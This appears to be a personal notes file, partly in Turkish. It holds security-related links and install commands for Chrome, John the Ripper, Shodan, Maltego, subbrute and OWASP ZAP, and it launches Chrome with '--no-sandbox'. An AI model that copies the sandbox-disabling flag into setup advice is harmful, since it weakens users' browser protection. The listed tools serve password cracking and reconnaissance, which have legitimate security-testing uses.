https://www.theguardian.com/technology/askjack/2015/jan/15/how-can-i-make-my-pc-completely-secure

https://www.news.com.au/travel/travel-updates/could-your-hotel-room-be-bugged-heres-how-to-check/news-story/c2e5e49c44fb385488315b09a9f3301f

https://support.microsoft.com/tr-tr/help/4028713/windows-10-turn-on-device-encryption

https://support.apple.com/tr-tr/HT204837
---------------------------------------------------------------------------------
YÜKLEMELER

GOOGLE CHROME

> wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
> apt install gdebi-core
> gdebi google-chrome-stable_current_amd64.deb
> google-chrome --no-sandbox

-------------

John

>apt-get install john
-------------

Geany

>apt-get install geany

-------------

Shodan

pip install shodan

-------------

Maltego

apt-get install maltegoce


-------------

Subbruter 

>cd opt
>git clone https://github.com/TheRook/subbrute.git

-------------

OWASP ZAP

https://www.zaproxy.org/download/     burdan indir

terminalde 

cd Downloads/
chmod o+x ZAP_2_9_0_unix.sh
./ZAP_2_9_0_unix.sh






















---------------------------------------------------------------------------------










































































